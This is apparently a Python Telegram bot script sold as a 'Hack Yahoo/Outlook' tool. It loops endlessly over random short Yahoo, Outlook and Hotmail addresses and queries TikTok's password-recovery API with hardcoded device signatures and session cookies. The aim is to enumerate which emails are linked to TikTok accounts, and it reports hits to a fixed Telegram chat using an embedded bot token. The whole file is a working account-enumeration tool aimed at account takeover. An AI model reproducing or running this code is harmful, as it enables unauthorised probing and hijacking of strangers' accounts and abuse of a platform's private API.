import telebot

import requests

import random

from telebot import types

token =("5195285218:AAHrsUX2hy3vBdtCvZUaLthsUYgIuQ0nlT4")
ID = ("1445263659")

bot = telebot.TeleBot(token)

Done = 0
bad = 0

@bot.message_handler(commands=['start'])
def welcome(message):
 Keyy = types.InlineKeyboardMarkup()
 kka = types.InlineKeyboardButton(text=" - Start Hack Yahoo  ",callback_data="button2")
 i = types.InlineKeyboardButton(text =" - Start Hack Outlouk",callback_data = 'n2')
 s = types.InlineKeyboardButton(text =" - Start Hack Outlouk",callback_data = 'na')
 Keyy.add(kka,i)
 Keyy.add(s)
 bot.reply_to(message,f''' [-] Hi Bro Bot Cheker TikTok 🐍
[-] BoT Never Not used Proxy 📍
[-] BoT in a Tools 📌
[-] No Block 🎈
[-] It Has Several Tools 🎉
[-] A Bot is Used For Several Things 🎃
[-] Program BoT  ( @ToOlsCariNo ) 🏆
[-] BoT Very Good 🎊
[-] Good Bay 🎯
[-] Version : 1.1 🌿 ''',reply_markup=Keyy)
 
@bot.callback_query_handler(func=lambda call: True)
def Alarab(call):
        if call.data == "button2":
        	ali(call.message)
        if call.data == "n2":
        	As(call.message)
        if call.data == "na":
        	D(call.message)
        	
        	
        	
        	
def ali(message):
    start_msg = requests.post(f"https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text=Start (:").json()
    id_msg	= (start_msg['result']["message_id"])
    global Done,bad
    while True:
    	num = 'amsoq0winxcnbvzlapaiwyyrmnbvcxz'
    	user = str(''.join(random.choice(num)for i in range(4)))
    	email = user+'@yahoo.com'
    	url = "https://api2-t2.musical.ly/aweme/v1/passport/find-password-via-email/?version_code=7.6.0&language=ar&app_name=musical_ly&vid=43647C38-9344-40A3-AD8E-29F6C7B987E4&app_version=7.6.0&is_my_cn=0&channel=App%20Store&mcc_mnc=&device_id=6999590732555060741&tz_offset=10800&account_region=&sys_region=SA&aid=1233&screen_width=1242&openudid=a0594f8115e0a1a51e1a31490aeef9afc2409ff4&os_api=18&ac=WIFI&os_version=12.5.4&app_language=ar&tz_name=Asia/Riyadh&device_platform=iphone&build_number=76001&iid=7021194671750481669&device_type=iPhone7,1&idfa=20DB6089-D1C6-49EF-8943-9C310C8F1B5D&mas=002ed4fcfe1207217efade4142d0b05e0c845e118f07206205d6a8&as=a11664d78a2e110bd08018&ts=16347494182"
    	headers = {
        'Host': 'api2-t2.musical.ly',
        'Cookie': 'store-country-code=sa; store-idc=alisg; install_id=7021194671750481669; odin_tt=7b67a77e780e497b1c89d483072f567580c860fe622a9ad519c8af998a287f424ed5f97297928981fa70ca6e8cb2648ebc46af23c9c9588a540567c77f877d307588080b16d8b92d3c3f875da9cd2291; ttreq=1$ee9fd401f276e956ba82d3ffd7392ffa6829472d',
        'Accept': '*/*',
        'Content-Type': 'application/x-www-form-urlencoded',
        'User-Agent': 'Musically/7.6.0 (iPhone; iOS 12.5.4; Scale/3.00)',
        'Accept-Language': 'ar-SA;q=1',
        'Content-Length': '25',
        'Connection': 'close'
        }
    	data = {
    	"email":email, 
        }
    	req = requests.post(url,headers=headers,data=data)
    	if req.text.find('"Bind device by email failed"')>=0:
    	   	bad +=1
    	   	requests.post(f"https://api.telegram.org/bot{token}/editmessagetext?chat_id={ID}&message_id={id_msg}&text=𝗖𝗛𝗘𝗖𝗞𝗜𝗡𝗚 𝗦𝗧𝗔𝗥𝗧𝗘𝗗 ▶️\n\nΞ 𝗜𝗻 : {email} \n\nΞ [✅] 𝗗𝗼𝗻𝗲 : {Done}\n\nΞ [❌] 𝗕𝗮𝗱 : {bad}")
    	else:
    	    Done +=1
    	    requests.post(f"https://api.telegram.org/bot{token}/editmessagetext?chat_id={ID}&message_id={id_msg}&text=𝗖𝗛𝗘𝗖𝗞𝗜𝗡𝗚 𝗦𝗧𝗔𝗥𝗧𝗘𝗗 ▶️\n\nΞ 𝗜𝗻 : {email} \n\nΞ [✅] 𝗗𝗼𝗻𝗲 : {Done}\n\nΞ [❌] 𝗕𝗮𝗱 : {bad}")
    	    bot.send_message(message.chat.id,f" - Hi New Account Tik Tok ✅\n - Email : {email}\n - User : {user}")
            
            
def As(message):
    start_msg = requests.post(f"https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text=Start (:").json()
    id_msg	= (start_msg['result']["message_id"])
    global Done,bad
    while True:
    	num = 'amsoq0winxcnbvzlapaiwyyrmnbvcxz'
    	user = str(''.join(random.choice(num)for i in range(4)))
    	email = user+'@outlook.com'
    	url = "https://api2-t2.musical.ly/aweme/v1/passport/find-password-via-email/?version_code=7.6.0&language=ar&app_name=musical_ly&vid=43647C38-9344-40A3-AD8E-29F6C7B987E4&app_version=7.6.0&is_my_cn=0&channel=App%20Store&mcc_mnc=&device_id=6999590732555060741&tz_offset=10800&account_region=&sys_region=SA&aid=1233&screen_width=1242&openudid=a0594f8115e0a1a51e1a31490aeef9afc2409ff4&os_api=18&ac=WIFI&os_version=12.5.4&app_language=ar&tz_name=Asia/Riyadh&device_platform=iphone&build_number=76001&iid=7021194671750481669&device_type=iPhone7,1&idfa=20DB6089-D1C6-49EF-8943-9C310C8F1B5D&mas=002ed4fcfe1207217efade4142d0b05e0c845e118f07206205d6a8&as=a11664d78a2e110bd08018&ts=16347494182"
    	headers = {
        'Host': 'api2-t2.musical.ly',
        'Cookie': 'store-country-code=sa; store-idc=alisg; install_id=7021194671750481669; odin_tt=7b67a77e780e497b1c89d483072f567580c860fe622a9ad519c8af998a287f424ed5f97297928981fa70ca6e8cb2648ebc46af23c9c9588a540567c77f877d307588080b16d8b92d3c3f875da9cd2291; ttreq=1$ee9fd401f276e956ba82d3ffd7392ffa6829472d',
        'Accept': '*/*',
        'Content-Type': 'application/x-www-form-urlencoded',
        'User-Agent': 'Musically/7.6.0 (iPhone; iOS 12.5.4; Scale/3.00)',
        'Accept-Language': 'ar-SA;q=1',
        'Content-Length': '25',
        'Connection': 'close'
        }
    	data = {
    	"email":email, 
        }
    	req = requests.post(url,headers=headers,data=data)
    	if req.text.find('"Bind device by email failed"')>=0:
    	   	bad +=1
    	   	requests.post(f"https://api.telegram.org/bot{token}/editmessagetext?chat_id={ID}&message_id={id_msg}&text=𝗖𝗛𝗘𝗖𝗞𝗜𝗡𝗚 𝗦𝗧𝗔𝗥𝗧𝗘𝗗 ▶️\n\nΞ 𝗜𝗻 : {email} \n\nΞ [✅] 𝗗𝗼𝗻𝗲 : {Done}\n\nΞ [❌] 𝗕𝗮𝗱 : {bad}")
    	else:
    	    Done +=1
    	    requests.post(f"https://api.telegram.org/bot{token}/editmessagetext?chat_id={ID}&message_id={id_msg}&text=𝗖𝗛𝗘𝗖𝗞𝗜𝗡𝗚 𝗦𝗧𝗔𝗥𝗧𝗘𝗗 ▶️\n\nΞ 𝗜𝗻 : {email} \n\nΞ [✅] 𝗗𝗼𝗻𝗲 : {Done}\n\nΞ [❌] 𝗕𝗮𝗱 : {bad}")
    	    bot.send_message(message.chat.id,f" - Hi New Account Tik Tok ✅\n - Email : {email}\n - User : {user}")


def D(message):
    start_msg = requests.post(f"https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text=Start (:").json()
    id_msg	= (start_msg['result']["message_id"])
    global Done,bad
    while True:
    	num = 'amsoq0winxcnbvzlapaiwyyrmnbvcxz'
    	user = str(''.join(random.choice(num)for i in range(4)))
    	email = user+'@Hotmail.com'
    	url = "https://api2-t2.musical.ly/aweme/v1/passport/find-password-via-email/?version_code=7.6.0&language=ar&app_name=musical_ly&vid=43647C38-9344-40A3-AD8E-29F6C7B987E4&app_version=7.6.0&is_my_cn=0&channel=App%20Store&mcc_mnc=&device_id=6999590732555060741&tz_offset=10800&account_region=&sys_region=SA&aid=1233&screen_width=1242&openudid=a0594f8115e0a1a51e1a31490aeef9afc2409ff4&os_api=18&ac=WIFI&os_version=12.5.4&app_language=ar&tz_name=Asia/Riyadh&device_platform=iphone&build_number=76001&iid=7021194671750481669&device_type=iPhone7,1&idfa=20DB6089-D1C6-49EF-8943-9C310C8F1B5D&mas=002ed4fcfe1207217efade4142d0b05e0c845e118f07206205d6a8&as=a11664d78a2e110bd08018&ts=16347494182"
    	headers = {
        'Host': 'api2-t2.musical.ly',
        'Cookie': 'store-country-code=sa; store-idc=alisg; install_id=7021194671750481669; odin_tt=7b67a77e780e497b1c89d483072f567580c860fe622a9ad519c8af998a287f424ed5f97297928981fa70ca6e8cb2648ebc46af23c9c9588a540567c77f877d307588080b16d8b92d3c3f875da9cd2291; ttreq=1$ee9fd401f276e956ba82d3ffd7392ffa6829472d',
        'Accept': '*/*',
        'Content-Type': 'application/x-www-form-urlencoded',
        'User-Agent': 'Musically/7.6.0 (iPhone; iOS 12.5.4; Scale/3.00)',
        'Accept-Language': 'ar-SA;q=1',
        'Content-Length': '25',
        'Connection': 'close'
        }
    	data = {
    	"email":email, 
        }
    	req = requests.post(url,headers=headers,data=data)
    	if req.text.find('"Bind device by email failed"')>=0:
    	   	bad +=1
    	   	requests.post(f"https://api.telegram.org/bot{token}/editmessagetext?chat_id={ID}&message_id={id_msg}&text=𝗖𝗛𝗘𝗖𝗞𝗜𝗡𝗚 𝗦𝗧𝗔𝗥𝗧𝗘𝗗 ▶️\n\nΞ 𝗜𝗻 : {email} \n\nΞ [✅] 𝗗𝗼𝗻𝗲 : {Done}\n\nΞ [❌] 𝗕𝗮𝗱 : {bad}")
    	else:
    	    Done +=1
    	    requests.post(f"https://api.telegram.org/bot{token}/editmessagetext?chat_id={ID}&message_id={id_msg}&text=𝗖𝗛𝗘𝗖𝗞𝗜𝗡𝗚 𝗦𝗧𝗔𝗥𝗧𝗘𝗗 ▶️\n\nΞ 𝗜𝗻 : {email} \n\nΞ [✅] 𝗗𝗼𝗻𝗲 : {Done}\n\nΞ [❌] 𝗕𝗮𝗱 : {bad}")
    	    bot.send_message(message.chat.id,f" - Hi New Account Tik Tok ✅\n - Email : {email}\n - User : {user}")
bot.polling()
		
		